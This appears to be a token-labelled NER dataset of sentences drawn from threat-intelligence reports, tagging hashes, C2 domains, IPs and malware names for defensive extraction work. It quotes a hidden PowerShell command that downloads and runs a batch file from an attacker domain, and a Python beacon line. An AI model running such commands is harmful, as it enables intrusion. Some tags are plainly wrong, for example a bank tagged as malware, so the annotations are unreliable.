\AppData\Roaming\Microsoft\VSA\.nlp	O
–	O
Stage	O
1	O
%	O
USERPROFILE	O
%	O
\AppData\Roaming\Microsoft\Protect\.nlp.hist	O
–	O
Stage	O
2	O
The	O
first	O
stage	O
is	O
executed	O
and	O
the	O
DLL	O
is	O
loaded	O
using	O
Reflective	O
DLL	O
Injection	O
.	O

Main	O
module	O
Encryption	O
Registry	O
Value	O
Device	O
name	O

The	O
downloaded	O
file	O
is	O
then	O
executed	O
by	O
the	O
malware	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

Xwizard.exe	O
KB12345678.exe	O
SndVolSSO.exe	O
88d35332ad30964af4f55f1e44	B-hash
c951b15a109832	I-hash
d48602c3c73e8e33162e8789	B-hash
1fb36a35f621b09b	I-hash
tonholding(.)com	B-url.cncsvr
nsquery(.)net	B-url.cncsvr
1fef52800fa9b752b98d3cbb8ff	B-hash
f0c44046526aa	I-hash
tonholding(.)com	B-url.cncsvr
nsquery(.)net	B-url.cncsvr

Moreover	O
,	O
the	O
developers	O
changed	O
the	O
compiler	O
;	O
they	O
switched	O
from	O
Visual	O
Studio	O
6.0	O
to	O
Visual	O
Studio	O
9.0/10.0	O
,	O
which	O
is	O
a	O
strong	O
indicator	O
for	O
the	O
huge	O
differences.Version	O
3.00	O
is	O
what	O
the	O
G	O
DATA	O
SecurityLabs	O
experts	O
call	O
ComRAT	B-malware.backdoor
.	O

It	O
is	O
hard	O
to	O
define	O
for	O
sure	O
,	O
,	O
but	O
to	O
our	O
knowledge	O
,	O
the	O
total	O
of	O
the	O
attacker	O
's	O
pastes	O
received	O
around	O
14K	O
views	O
,	O
~11K	O
for	O
dropped	O
payload	O
URL	O
and	O
~2k	O
for	O
the	O
android	O
miner	O
paste	O
.	O

73f493f6a2b0da23a79b50765c164e88	B-hash
f6fafb7c30b1114befc93f39d0698560	B-hash
eaa6e03d9dae356481215e3a9d2914dc	B-hash
0	O
0824.1.doc	O
File	O
Name	O
06da4eb2ab6412c0dc7f295920eb61c4	B-hash
53baedf3765e27fb465057c48387c9b6	B-hash
103	O
3	O
00a95fb30be2d6271c491545f6c6a707	B-hash
2014	O
09	O
17	O
Welcome	O
Reception	O
for	O
Bob	O
4ab6bf7e6796bb930be2dd0141128d06	B-hash
_Y103	O
(	O
2	O
)	O
_	O
and	O
Jason_invitation.doc	O
(	O
0825	O
)	O
.doc	O
Exploit	O

SHA-1	O
SHA-256	O
File	O
Size	O
374896a75493a406eb427f35eec86fe5	B-hash
7fbf5f83f34b8a3531fb1be7eca83167648e7b21	B-hash
1228e9066819f115e8b2a6c1b75352566a6a5dc002d9d36a8c5b47758c9f6a45	B-hash
294	O
KB	O

This	O
last	O
DLL	B-malware.unknown
seems	O
to	O
be	O
completely	O
unconnected	O
with	O
the	O
previous	O
samples	O
,	O
but	O
further	O
investigation	O
leads	O
us	O
into	O
believing	O
that	O
it	O
was	O
an	O
additional	O
component	O
used	O
by	O
APT28	O
in	O
this	O
campaign	O
to	O
compromise	O
the	O
target	O
system	O
.	O

Importance	O

This	O
file	O
is	O
part	O
of	O
the	O
Microsoft	O
Office	O
suite	O
and	O
can	O
be	O
used	O
to	O
find	O
keywords	O
within	O
Outlook	O
data	O
files	O
.	O

This	O
functionality	O
resembles	O
a	O
method	O
described	O
by	O
SecurityExploded	O
for	O
'	O
Recovering	O
Passwords	O
from	O
Outlook	B-malware.unknown
2002-2013	O
'	O
.	O

In	O
order	O
to	O
track	O
who	O
opened	O
the	O
phishing	O
emails	O
,	O
viewed	O
the	O
links	O
,	O
and	O
downloaded	O
the	O
attachments	O
in	O
real-time	O
,	O
APT32	B-malware.infosteal
used	O
cloud-based	O
email	O
analytics	O
software	O
designed	O
for	O
sales	O
organizations	O
.	O

The	O
servers	O
operated	O
in	O
19	O
different	O
countries	O
.	O

First	O
of	O
all	O
,	O
if	O
they	O
had	O
been	O
used	O
in	O
Stuxnet	B-malware.backdoor
,	O
they	O
would	O
have	O
left	O
a	O
far	O
bigger	O
footprint	O
than	O
the	O
individual	O
cases	O
we	O
have	O
detected	O
.	O

The	O
real	O
C2	O
server	O
,	O
103.236.150[.]14	B-ip.unknown
,	O
is	O
actually	O
hardcoded	O
(	O
see	O
Exhibit	O
4	O
)	O
.	O

Figure	O
5	O
A	O
sample	O
of	O
the	O
data	O
that	O
is	O
encrypted	O
and	O
sent	O
to	O
the	O
CnC	O
server	O
for	O
version	O
'	O
p=2	O
'	O
is	O
seen	O
in	O
the	O
memory	O
dump	O
shown	O
in	O
Figure	O
6	O
.	O

Targeting	O
profiles	O
,	O
spearphish	O
filenames	O
,	O
and	O
lures	O
carry	O
thematic	O
content	O
related	O
to	O
visa	O
applications	O
and	O
scanned	O
images	O
,	O
border	O
control	O
administration	O
,	O
and	O
various	O
administrative	O
notes	O
.	O

A	O
large	O
team	O
of	O
human	O
analysts	O
is	O
also	O
required	O
to	O
manually	O
sort	O
through	O
captured	O
data	O
and	O
process	O
it	O
manually	O
and/or	O
with	O
Big	O
Data-like	O
analytics	O
.	O

Antivirus	O
disablement	O
:	O
Malware	O
attempts	O
to	O
disable	O
Ahnlab	O
and	O
Hauri	O
antivirus	O
.	O

Domain	O
First	O
Seen	O
Last	O
Seen	O

'	O
Russian	O
Sports	O
Minister	O
Vitaly	O
Mutko	O
Denies	O
Link	O
to	O
Wada	O
Hackers	O
.	O
'	O

EXITEWINDOWS	O
calls	O
ExitWindowsEx	O
.	O

The	O
document	O
is	O
named	O
to	O
Nguyen	O
Anh	O
Tuan	O
,	O
which	O
is	O
presented	O
as	O
author	O
of	O
this	O
crafted	O
text	O
.	O

Further	O
analysis	O
of	O
the	O
street	O
addresses	O
enabled	O
root9B	O
to	O
correlate	O
the	O
address	O
and	O
personas	O
listed	O
as	O
registrants	O
via	O
public	O
records	O
,	O
doing	O
so	O
showed	O
that	O
most	O
of	O
these	O
addresses	O
did	O
not	O
even	O
exist	O
,	O
and	O
the	O
few	O
addresses	O
confirmed	O
to	O
physically	O
exist	O
did	O
not	O
have	O
residents	O
with	O
the	O
names	O
listed	O
.	O

Clearly	O
,	O
english	O
and	O
maturity	O
was	O
not	O
the	O
developers	O
'	O
native	O
language	O
.	O

If	O
so	O
,	O
is	O
this	O
simply	O
a	O
matter	O
of	O
accepted	O
state	O
espionage	O
,	O
or	O
did	O
it	O
cross	O
a	O
line	O
?	O

2016	O
.	O

This	O
loop	O
occurs	O
many	O
times	O
,	O
and	O
each	O
time	O
it	O
will	O
also	O
allocate	O
a	O
chunk	O
of	O
memory	O
on	O
the	O
heap	O
,	O
performing	O
math	O
operations	O
on	O
it	O
and	O
printing	O
it	O
to	O
the	O
console	O
over	O
and	O
over	O
again	O
.	O

The	O
last	O
payload	O
downloaded	O
is	O
a	O
slightly	O
modifi	O
ed	O
Gh0st	B-malware.backdoor
RAT	I-malware.backdoor
sample	O
designed	O
to	O
act	O
as	O
a	O
backdoor	O
implant	O
.	O

Also	O
,	O
throughout	O
the	O
year	O
and	O
in	O
previous	O
years	O
,	O
researchers	O
began	O
to	O
comment	O
publicly	O
on	O
Sofacy	O
's	O
fairly	O
consistent	O
infrastructure	O
setup	O
.	O

Figure	O
25	O
:	O
Cache	O
filename	O
Figure	O
26	O
:	O
Using	O
mshta.exe	O
to	O
download	O
additional	O
payload	O

The	O
second	O
push	O
is	O
the	O
function	O
to	O
call	O
and	O
the	O
first	O
one	O
is	O
the	O
address	O
of	O
the	O
next	O
basic	O
block	O
to	O
jump	O
to	O
.	O

The	O
dropper	O
then	O
executes	O
the	O
utility	O
using	O
the	O
command	O
audiodg.exe	O
/scomma	O
scxrt2.ini	O
.	O

Tweet	O
.	O

The	O
HTTP	O
flood	O
also	O
appears	O
to	O
be	O
intended	O
as	O
a	O
rudimentary	O
GET	O
flood	O
with	O
a	O
minimalist	O
HTTP	O
request	O
header	O
.	O

Then	O
it	O
goes	O
through	O
four	O
iterations	O
of	O
a	O
loop	O
that	O
has	O
no	O
purpose	O
other	O
than	O
to	O
increment	O
EBX	O
by	O
one	O
on	O
each	O
iteration	O
,	O
resulting	O
in	O
a	O
value	O
of	O
891	O
.	O

We	O
have	O
identified	O
several	O
'	O
subject	O
tags	O
'	O
in	O
the	O
network	O
communication	O
:	O
Down_0	O
,	O
Down_1	O
,	O
Happy_0	O
,	O
Happy_2	O
and	O
ddd_3	O
.	O

This	O
domain	O
has	O
been	O
active	O
since	O
at	O
least	O
October	O
2012	O
and	O
has	O
pointed	O
to	O
many	O
different	O
addresses	O
in	O
Syrian	O
IP	O
space	O
on	O
both	O
the	O
SyriaTel	O
and	O
Tarassul	O
ISPs	O
,	O
as	O
well	O
as	O
AnchorFree	O
VPN	O
addresses	O
.	O

The	O
new	O
discoveries	O
included	O
evidence	O
related	O
to	O
past	O
attempts	O
to	O
launch	O
attacks	O
against	O
many	O
of	O
the	O
same	O
targets	O
,	O
including	O
the	O
aforementioned	O
Commercial	B-malware.infosteal
Bank	I-malware.infosteal
International	I-malware.infosteal
.	O

Cyberkov	O
recommends	O
the	O
following	O
points	O
in	O
order	O
to	O
protect	O
the	O
victims	O
from	O
such	O
malwares	O
:	O
Install	O
DrWeb	O
Security	O
Space	O
for	O
Android	O
(	O
A	O
leading	O
Russian	O
AntiVirus	O
Company	O
)	O
Update	O
your	O
Android	O
operating	O
system	O
regularly	O
Use	O
of	O
DrWeb	O
Telegram	O
Bot	O
(	O
DrWebBot	O
)	O
to	O
scan	O
links	O
and	O
files	O
shared	O
on	O
Telegram	O
chats	O
or	O
groups	O
Never	O
install	O
applications	O
from	O
unknown	O
sources	O
Use	O
Telegram	O
with	O
Secret	O
Chat	O
feature	O
only	O
Always	O
verify	O
with	O
your	O
partners	O
when	O
sending	O
and	O
receiving	O
files	O
Install	O
Zemana	O
Mobile	O
AntiVirus	O
(	O
A	O
leading	O
Turkish	O
AntiMalware	O
and	O
AntiFraud	O
Company	O
)	O
The	O
following	O
table	O
summarizes	O
the	O
list	O
of	O
indicators	O
to	O
detect	O
the	O
malware	O
:	O

Both	O
the	O
THREEBYTE	B-malware.backdoor
and	O
HIGHTIDE	B-malware.backdoor
backdoors	O
were	O
written	O
to	O
the	O
same	O
filepath	O
of	O
C	O
:	O
\DOCUMENTS	O
and	O
SETTINGS\	O
{	O
user	O
}	O
\LOCAL	O
SETTINGS\Temp\word.exe	O
.	O

62749484f7a6b4142a2b5d54f589a950483dfcc9	B-hash
cb3a982e15ae382c0f6bdacc0fcecf3a9d4a068d	B-hash

Only	O
the	O
best	O
individuals	O
or	O
teams	O
succeed	O
,	O
are	O
paid	O
,	O
and	O
remain	O
in	O
business	O
.	O

So	O
far	O
,	O
more	O
than	O
30	O
APT	O
and	O
underground	O
economy	O
groups	O
have	O
been	O
discovered	O
and	O
revealed	O
.	O

4.5.1	O
Network	O

tmbmsrv.exe	O
tmccsf.exe	O
cntaosmgr.exe	O
Trend	O
Micro	O
OfficeScan	O
Add-on	O
Service	O
Client	O
Management	O
Service	O

T	O
here	O
were	O
traces	O
of	O
HyperBro	B-malware.backdoor
in	O
the	O
infected	O
data	O
center	O
from	O
mid-November	O
2017	O
.	O

And	O
here	O
,	O
an	O
interest	O
in	O
military	O
technologies	O
is	O
certainly	O
within	O
Sofacy	O
purview	O
.	O

Fig	O
7	O
.	O

Chafer	O
's	O
activities	O
have	O
some	O
links	O
to	O
another	O
group	O
known	O
as	O
Crambus	O
(	O
aka	O
Oilrig	O
)	O
.	O

fifa	O
flash	O
ftp	O
gaming	O
google	O
google	O

Once	O
the	O
lure	O
's	O
recipient	O
opens	O
and	O
executes	O
the	O
file	O
,	O
a	O
backdoor	O
will	O
be	O
dropped	O
into	O
the	O
victim	O
's	O
system	O
.	O

Using	O
VirusTotal	O
allowed	O
the	O
developer	O
to	O
make	O
changes	O
in	O
an	O
attempt	O
to	O
decrease	O
antivirus	O
detection	O
.	O

The	O
metadata	O
in	O
the	O
document	O
shows	O
that	O
it	O
was	O
also	O
titled	O
'	O
/	O
'	O
,	O
which	O
happens	O
to	O
be	O
the	O
name	O
of	O
the	O
Guidance	O
Commission	O
Office	O
's	O
Chief	O
Executive	O
:	O
The	O
naming	O
convention	O
and	O
content	O
of	O
the	O
file	O
may	O
indicate	O
an	O
attacker	O
's	O
familiarity	O
with	O
the	O
nature	O
of	O
the	O
victim	O
.	O

The	O
SPC	O
website	O
contained	O
JavaScript	O
causing	O
the	O
client	O
browser	O
to	O
load	O
an	O
iframe	O
loading	O
the	O
contents	O
of	O
http://rootadmin2012.com,	B-url.unknown
which	O
was	O
the	O
main	O
attack	O
site	O
for	O
hosting	O
the	O
malicious	O
payloads	O
.	O

Examining	O
the	O
memory	O
image	O
of	O
a	O
machine	O
infected	O
with	O
the	O
malware	O
shows	O
that	O
a	O
technique	O
for	O
infecting	O
processes	O
known	O
as	O
'	O
process	B-malware.unknown
hollowing	I-malware.unknown
'	O
is	O
used	O
.	O

http://www.fireeye.com/blog/technical/2013/08/operation-molerats-middle-east-cyber-attacks-using-poison-ivy.html	B-url.normal
5	O
.	O

©	O
AhnLab	O
,	O
Inc	O
.	O

203.80.238.183	B-ip.unknown

We	O
found	O
an	O
Android	B-malware.infosteal
FinSpy	I-malware.infosteal
Mobile	I-malware.infosteal
sample	O
in	O
the	O
wild	O
with	O
a	O
command	O
&	O
control	O
server	O
in	O
Vietnam	O
that	O
also	O
exfiltrates	O
text	O
messages	O
to	O
a	O
local	O
phone	O
number	O
.	O

We	O
have	O
observed	O
DragonOK	B-malware.infosteal
and	O
Moafee	B-malware.infosteal
use	O
the	O
Nflog	B-malware.backdoor
implant	O
in	O
addition	O
to	O
an	O
earlier	O
version	O
of	O
the	O
NewCT2	B-malware.backdoor
implant	O
.	O

In	O
several	O
cases	O
,	O
Symantec	O
has	O
been	O
able	O
to	O
follow	O
the	O
entire	O
chain	O
of	O
compromised	O
routers	O
and	O
found	O
it	O
led	O
to	O
a	O
virtual	O
private	O
server	O
(	O
VPS	O
)	O
,	O
meaning	O
the	O
attackers	O
have	O
employed	O
an	O
additional	O
layer	O
of	O
security	O
by	O
routing	O
communications	O
through	O
rented	O
hosting	O
servers	O
.	O

The	O
archaeological	O
effort	O
of	O
understanding	O
such	O
a	O
long­standing	O
group	O
can	O
severely	O
complicate	O
victim	O
identification	O
.	O

Mr	O
.	O

This	O
is	O
how	O
the	O
main	O
module	O
knows	O
which	O
modules	O
should	O
be	O
downloaded	O
to	O
a	O
particular	O
target	O
.	O

EvilGrab	B-malware.drop
steals	O
internal	O
user	O
names	O
and	O
passwords	O
as	O
well	O
as	O
logs	O
keystrokes	O
.	O

Agent.RUI	O
Win32/TrojanDropper	O
.	O

We	O
are	O
calling	O
the	O
APT	O
'	O
Tempting	B-malware.infosteal
Cedar	I-malware.infosteal
Spyware	I-malware.infosteal
'	O
.	O

//	O
10003930	O
$	O
=	O
'	O
%	O
08x%08x	O
%	O
08x%08x	O
'	O
wide	O
ascii	O
$	O
=	O
'	O
WinHttpGetIEProxyConfigForCurrentUser	O
'	O
wide	O
ascii	O
condition	O
:	O
(	O
uint16	O
(	O
0	O
)	O
==	O
0x5A4D	O
or	O
uint32	O
(	O
0	O
)	O
==	O
0x4464c457f	O
)	O
and	O
(	O
all	O
of	O
them	O
)	O

The	O
source	O
port	O
is	O
randomly	O
selected	O
.	O

No	O
zero­day	O
vulnerabilities	O
have	O
been	O
found	O
in	O
the	O
analysis	O
of	O
the	O
samples	O
obtained	O
regarding	O
this	O
campaign	O
.	O

DLL	B-malware.backdoor
preloading	I-malware.backdoor
is	O
a	O
vulnerability	O
that	O
has	O
been	O
documented	O
for	O
over	O
three	O
years	O
.	O

Dynamic	O
Function	O
Calls	O
:	O
Iron	B-malware.backdoor
Backdoor	I-malware.backdoor
is	O
also	O
using	O
the	O
DynamicCall	O
module	O
from	O
HackingTeam	O
's	O
'	O
core	O
'	O
library	O
.	O

Figure	O
6	O
shows	O
the	O
Python-style	O
pseudo-code	O
that	O
calculates	O
the	O
hash	O
for	O
a	O
function	O
.	O

The	O
dropper	O
is	O
used	O
to	O
install	O
the	O
backdoor	O
into	O
the	O
infected	O
system	O
and	O
establish	O
its	O
persistence	O
.	O

The	O
team	O
is	O
dedicated	O
in	O
APT	O
attack	O
investigation	O
,	O
threat	O
incident	O
response	O
and	O
underground	O
economy	O
industrial	O
chain	O
studies	O
.	O

Figure	O
22	O
:	O
ExtendedUIHoverTime	O
Registry	O
Key	O
Change	O
Figure	O
22	O
:	O
ExtendedUIHoverTime	O
Registry	O
Key	O
Change	O

Malware	O
Analysis	O
Report	O
Operation	O
Roman	O
Holiday	O
–	O
Hunting	O
the	O
Russian	O
APT28	O
group	O

Avoid	O
password	O
policies	O
that	O
reduce	O
the	O
overall	O
strength	O
of	O
credentials	O
.	O

Google-Privacy.doc	O
(	O
9c60fadece6ea770e2c1814ac4b3ae74	B-hash
)	O
uploaded	O
to	O
VirusTotal	O
on	O
3	O
December	O
2015	O

Where	O
initially	O
they	O
had	O
only	O
a	O
single	O
fake	O
domain	O
pointed	O
at	O
CBI	O
,	O
now	O
there	O
were	O
six	O
additional	O
domains	O
,	O
all	O
used	O
to	O
target	O
this	O
single	O
victim	O
.	O

However	O
,	O
we	O
observe	O
no	O
direct	O
links	O
between	O
Operation	B-malware.ransom
Manul	I-malware.ransom
and	O
Arcanum	O
.	O

The	O
C	O
&	O
C	O
servers	O
tend	O
to	O
operate	O
from	O
domains	O
hosted	O
on	O
dynamic	O
DNS	O
.	O

The	O
statistics	O
also	O
show	O
that	O
the	O
number	O
of	O
hits	O
(	O
and	O
implicitly	O
,	O
the	O
number	O
of	O
victims	O
)	O
is	O
constantly	O
increasing	O
,	O
as	O
per	O
the	O
graphic	O
below	O
:	O
3.1.1	O
.	O

The	O
.lnk	O
file	O
shown	O
in	O
Figure	O
17	O
opens	O
the	O
malicious	O
VBS	O
dropped	O
on	O
the	O
system	O
.	O

In	O
general	O
,	O
their	O
work	O
is	O
very	O
professional	O
and	O
focused	O
.	O

C2	O
Server	O
:	O
algorithm.ddnsgeek[.]com	B-url.cncsvr

The	O
messages	O
are	O
parsed	O
looking	O
for	O
information	O
tagged	O
with	O
the	O
following	O
strings	O
:	O

Figure	O
9	O
-	O
Whois	O
information	O
about	O
'	O
marina-info.net	B-url.unknown
'	O

Figure	O
2	O
:	O
Example	O
Flash	O
object	O
included	O
via	O
'	O
Movie	O
'	O
property	O
which	O
specifies	O
remote	O
location	O
of	O
Flash	O
object	O
.	O

Code	O
in	O
the	O
malicious	O
software	O
closely	O
matched	O
usage	O
on	O
a	O
control	O
engineering	O
blog	O
dealing	O
with	O
PLCSIM	O
(	O
https://alexsentcha.wordpress.com/using-s7-prosim-with-siemens-s7-plcsim/	B-url.normal
and	O
https://pcplcdemos.googlecode.com/hg/S7PROSIM/BioGas/S7%20v5.5/	B-url.normal
)	O
.	O

inbox.mailboxhus(.)com	B-url.cncsvr
support.chatconnecting(.)com	B-url.cncsvr
Flash.exe	O
01ffc3ee5c2c560d29aaa8ac3d17f0ea4f6c0c09	B-hash
2016-12-28	O
09:51:13	O

The	O
scrambled	O
AES256	O
key	O
is	O
marked	O
green	O
,	O
while	O
the	O
encrypted	O
computer	O
info	O
is	O
marked	O
red	O
.	O

PhysicalDrive	O
deviceIOControl	O
0x2D1400	O
(	O
IOCTL_STORAGE_QUERY_	O
PROPERTY	O
)	O
(	O
VolSerialNumber	O
)	O

The	O
ever-shifting	O
threats	O
and	O
increasingly	O
expanding	O
attack	O
surface	O
will	O
challenge	O
users	O
and	O
enterprises	O
to	O
catch	O
up	O
with	O
their	O
security	O
.	O

These	O
have	O
to	O
be	O
32-bit	O
processes	O
,	O
not	O
already	O
infected	O
and	O
not	O
among	O
a	O
list	O
of	O
processes	O
to	O
avoid	O
such	O
as	O
winlogon.exe	O
,	O
explorer.exe	O
,	O
cmd.exe	O
or	O
regsvr32.exe	O
.	O

We	O
also	O
found	O
this	O
attack	O
group	O
We	O
observed	O
both	O
attack	O
groups	O
employ	O
decoy	O
documents	O
in	O
order	O
to	O
help	O
deceive	O
potential	O
victims	O
.	O

The	O
malware	O
is	O
located	O
in	O
the	O
'	O
<	O
UserHomedir	O
>	O
/Library/Assistants/.local/	O
'	O
path	O
in	O
a	O
random	O
directory	O
with	O
a	O
name	O
picked	O
from	O
a	O
hardcoded	O
list	O
.	O

Decrypted	O
Value	O

The	O
exfiltration	O
of	O
sensitive	O
data	O
is	O
done	O
in	O
order	O
to	O
coerce	O
the	O
victim	O
into	O
a	O
business	O
relationship	O
under	O
the	O
threat	O
of	O
exchanging	O
this	O
information	O
with	O
competitors	O
or	O
leveraging	O
it	O
as	O
part	O
of	O
the	O
company	O
's	O
offering	O
of	O
'	O
investment	O
forecasting	O
'	O
.	O

Once	O
the	O
packet	O
is	O
decrypted	O
and	O
decompressed	O
,	O
the	O
data	O
follow	O
the	O
format	O
:	O

In	O
time	O
,	O
more	O
evidence	O
appeared	O
and	O
allowed	O
us	O
,	O
and	O
others	O
,	O
to	O
link	O
them	O
together	O
with	O
high	O
confidence	O
.	O

StrongPity	O
previously	O
set	O
up	O
TrueCrypt	O
themed	O
watering	B-malware.backdoor
holes	I-malware.backdoor
in	O
late	O
2015	O
.	O

This	O
activity	O
by	O
RIS	O
is	O
part	O
of	O
an	O
ongoing	O
campaign	O
of	O
cyber-enabled	O
operations	O
directed	O
at	O
the	O
U.S.	O
government	O
and	O
its	O
citizens	O
.	O

Please	O
contact	O
us	O
:	O
openy0urm1nd@protonmail.ch	O

The	O
path	O
of	O
the	O
main	O
browser	O
of	O
the	O
workstation	O
is	O
obtained	O
by	O
reading	O
the	O
registry	O
value	O
:	O

In	O
August	O
2017	O
,	O
the	O
Indian	O
National	O
CERT	O
published	O
an	O
advisory	O
about	O
malicious	O
targeted	O
campaigns	O
.	O

Here	O
is	O
an	O
example	O
of	O
just	O
one	O
of	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
's	O
text-based	O
payloads	O
(	O
for	O
more	O
details	O
,	O
see	O
'	O
Payload	O
Attributes	O
'	O
on	O
Page	O
11	O
)	O
:	O
ASPX	O
:	O

CTU	O
researchers	O
recommend	O
that	O
clients	O
take	O
appropriate	O
precautions	O
to	O
minimize	O
the	O
risk	O
of	O
these	O
types	O
of	O
attacks	O
:	O
Educate	O
users	O
about	O
the	O
risks	O
of	O
spearphishing	O
emails	O
.	O

This	O
analysis	O
is	O
based	O
on	O
information	O
obtained	O
from	O
the	O
media	O
as	O
well	O
as	O
technical	O
reports	O
of	O
various	O
malware	O
research	O
labs	O
such	O
as	O
AhnLab	O
,	O
Imperva	O
,	O
Symantec	O
,	O
Avast	O
,	O
Kaspersky	O
,	O
Alienvault	O
,	O
and	O
Sophos	O
.	O

ProcessExplorer	O
is	O
used	O
to	O
identify	O
malware	O
hiding	O
inside	O
a	O
legitimate	O
process	O
as	O
a	O
DLL	O
,	O
which	O
occurs	O
as	O
a	O
result	O
of	O
DLL	O
injection	O
.	O

It	O
then	O
infects	O
existing	O
operating	O
system	O
processes	O
,	O
connects	O
to	O
the	O
command	O
and	O
control	O
server	O
,	O
and	O
begins	O
data	O
harvesting	O
and	O
exfiltration	O
.	O

rndismpc.sys	O
mrxcls.sys	O
mrxcls.sys	O
(	O
signed	O
)	O
rtniczw.sys	O
(	O
signed	O
)	O
jmidebs.sys	O
(	O
signed	O
)	O
.sys*	O
.sys*	O

When	O
opened	O
with	O
a	O
vulnerable	O
version	O
of	O
Microsoft	O
Word	O
,	O
the	O
exploit	O
will	O
initiate	O
the	O
infection	O
routine	O
and	O
display	O
the	O
legitimate	O
document	O
that	O
follows	O
:	O
This	O
document	O
,	O
written	O
in	O
Vietnamese	O
,	O
appears	O
to	O
be	O
reviewing	O
and	O
discussing	O
best	O
practices	O
for	O
teaching	O
and	O
researching	O
scientific	O
topics	O
.	O

For	O
any	O
enquiries	O
or	O
sample	O
submissions	O
related	O
to	O
the	O
subject	O
,	O
contact	O
as	O
at	O
:	O
threatintel@eset.com	O
.	O

During	O
the	O
time	O
of	O
analysis	O
the	O
text	O
file	O
downloaded	O
from	O
the	O
Google	O
drive	O
link	O
was	O
populated	O
with	O
two	O
private	O
IP	O
addresses	O
,	O
it	O
looks	O
like	O
the	O
attackers	O
deliberately	O
populated	O
the	O
IP	O
addresses	O
with	O
two	O
private	O
IP	O
addresses	O
to	O
prevent	O
the	O
researchers	O
from	O
determining	O
actual	O
IP/domain	O
names	O
of	O
the	O
backup	O
C2	O
servers	O
.	O

Domain	O

Until	O
such	O
evidence	O
is	O
made	O
public	O
,	O
we	O
will	O
leave	O
it	O
to	O
our	O
readers	O
to	O
judge	O
for	O
themselves	O
.	O

dfiles5	O
=	O
urlopen	O
(	O
'	O
http://'+	O
getserver	O
+	O
foldername+	O
'	O
/online.php?sysname='+cname+	O
'	O
'	O
)	O

In	O
between	O
those	O
highly	O
advanced	O
attacks	O
,	O
more	O
and	O
more	O
attackers	O
possessing	O
only	O
a	O
basic	O
set	O
of	O
skills	O
started	O
to	O
pop	O
up	O
–	O
spreading	O
well	O
known	O
RATs	B-malware.backdoor
,	O
obfuscated	O
with	O
generic	O
publicly-available	O
packers	O
.	O

The	O
primary	O
control	O
logic	O
can	O
be	O
found	O
in	O
the	O
module	O
registered	O
under	O
the	O
service	O
key	O
(	O
rasmon.dll	O
,	O
etc	O
.	O
)	O

powershell	O
-windowstyle	O
hidden	O
$	O
c=	O
'	O
(	O
new-object	O
System.Net.WebClient	O
)	O
.D'+'ownloadFile	O
(	O
'	O
'	O
'	O
http://online-dropbox.com/online/a	O
'	O
'	O
'	O
,	O
'	O
'	O
'	O
$	O
env:tmp\gst.bat	O
'	O
'	O
'	O
)	O
'	O
;	O
Invoke-Expression	O
$	O
c&%tmp%\gst.bat	O
'	O
%	O
CD	O
%	O
'	O

Solutions	O
that	O
feature	O
behavior	O
monitoring	O
,	O
application	O
control	O
,	O
email	O
gateway	O
monitoring	O
,	O
and	O
intrusion/detection	O
systems	O
can	O
help	O
with	O
this	O
.	O

Figure	O
11	O
-	O
The	O
ThreatMap	O

Attack	O
Option	O
3	O
:	O
Reprogram	O
the	O
SIS	O
to	O
allow	O
an	O
unsafe	O
state	O
–	O
while	O
using	O
the	O
DCS	O
to	O
create	O
an	O
unsafe	O
state	O
or	O
hazard	O

To	O
make	O
traffic	O
analysis	O
and	O
detection	O
more	O
difficult	O
,	O
the	O
group	O
uses	O
a	O
substitute	O
cipher	O
to	O
obfuscate	O
the	O
data	O
before	O
it	O
is	O
sent	O
to	O
the	O
C2	O
:	O
Another	O
way	O
used	O
to	O
disguise	O
the	O
DNS	O
traffic	O
and	O
lower	O
the	O
suspicions	O
of	O
SOC	O
and	O
NOC	O
teams	O
was	O
the	O
use	O
IPs	O
from	O
address	O
blocks	O
of	O
Microsoft	O
and	O
McAfee	O
in	O
the	O
C2	O
responses	O
:	O
Once	O
a	O
command	O
is	O
received	O
from	O
the	O
C2	O
server	O
in	O
the	O
DNS	O
response	O
,	O
the	O
RAT	B-malware.backdoor
will	O
translate	O
it	O
to	O
a	O
corresponding	O
command	O
.	O

Figure	O
8	O
Data	O
that	O
has	O
been	O
written	O
into	O
module	O
3	O

The	O
results	O
of	O
this	O
algorithm	O
are	O
then	O
compared	O
against	O
three	O
static	O
values	O
:	O
0x1E00AFA	B-hash
,	O
0xBEE091E8	B-hash
and	O
0xD46FCDFA	B-hash
.	O

Base64-decoded	O
parameters	O
z1	O
and	O
z2	O
:	O

This	O
provider	O
is	O
popular	O
with	O
several	O
Middle	O
Eastern	O
threat	O
actors	O
tracked	O
by	O
PwC	O
's	O
intelligence	O
team	O
.	O

In	O
some	O
cases	O
,	O
the	O
domains	O
scanned	O
were	O
hosted	O
on	O
the	O
same	O
server	O
;	O
sometimes	O
the	O
attackers	O
went	O
through	O
the	O
list	O
of	O
possible	O
domains	O
matching	O
a	O
given	O
IP	O
.	O

In	O
2015	O
,	O
SkyEye	O
Labs	O
,	O
the	O
security	O
research	O
division	O
of	O
the	O
Chinese	O
firm	O
Qihoo	O
360	O
,	O
released	O
a	O
report	O
detailing	O
threat	O
actors	O
that	O
were	O
targeting	O
Chinese	O
public	O
and	O
private	O
entities	O
including	O
government	O
agencies	O
,	O
research	O
institutes	O
,	O
maritime	O
agencies	O
,	O
sea	O
construction	O
,	O
and	O
shipping	O
enterprises	O
.	O

As	O
we	O
will	O
see	O
,	O
identifying	O
web	O
shells	B-malware.backdoor
can	O
be	O
much	O
harder	O
than	O
finding	O
malicious	O
binaries	O
.	O

Essentially	O
,	O
this	O
involves	O
creating	O
a	O
remediation	O
plan	O
for	O
effectively	O
combating	O
the	O
threat	O
and	O
using	O
round-the-clock	O
intrusion	O
detection	O
and	O
threat	O
analysis	O
to	O
prevent	O
attacks	O
from	O
entering	O
the	O
system	O
.	O

Popup	O
message	O
when	O
the	O
user	O
opens	O
the	O
document	O
that	O
abuses	O
Link	O
Auto	O
Update	O

dwPktType	O
=	O
4	O
)	O
.	O

d5d99497ebb72f574c9429ecd388a019	B-hash
Mayo	O
Uranio2011	O
3.6	O
G7fjZQYAH	O
G7fjZQYAH	O
kUHwdc8Y	O
eYwJ6QX0i	O
0pg6ooH	O
0pg6ooH	O
xjUfrQHP6Xy	O
xjUfrQHP6Xy	O
xjUfrQHP6Xy	O
R9lmAhUK	O
0pg6ooH	O
1.3.6.16	O
QwcgY0a	O
1.3.6.16	O
QwcgY0a	O
1.3.6.16	O
1.3.6.16	O
1.3.6.16	O
KdXTsbjJ6	O
KdXTsbjJ6	O
UBt3eQq0	O
iodjmGyP3	O
UBt3eQq0	O

Messages	O
to	O
cover	O
the	O
funds	O
for	O
the	O
payments	O
were	O
incorrectly	O
created	O
and	O
